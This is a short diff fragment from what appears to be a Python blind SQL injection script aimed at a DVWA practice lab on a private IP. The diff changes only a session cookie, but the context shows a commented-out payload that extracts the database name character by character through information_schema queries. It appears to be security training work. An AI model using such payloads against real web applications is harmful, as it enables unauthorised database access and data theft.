@@ -10,7 +10,7 @@ proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 url = "http://192.168.131.135/dvwa/vulnerabilities/sqli_blind/?id="
 
-cookies = {"PHPSESSID": "pb0n64t284vhfue0gf6g7f2mh4", "security": "low"}
+cookies = {"PHPSESSID": "rdkpnlqrrt27bg3hmsisj77gk9", "security": "low"}
 
 def req(row, num, oper, pas):
     # payload = "' or (select if((ascii(substring(database(), %s, 1)) %s %s),(select table_name from information_schema.tables),'a')) = 'a'-- " % (num, oper, pas)
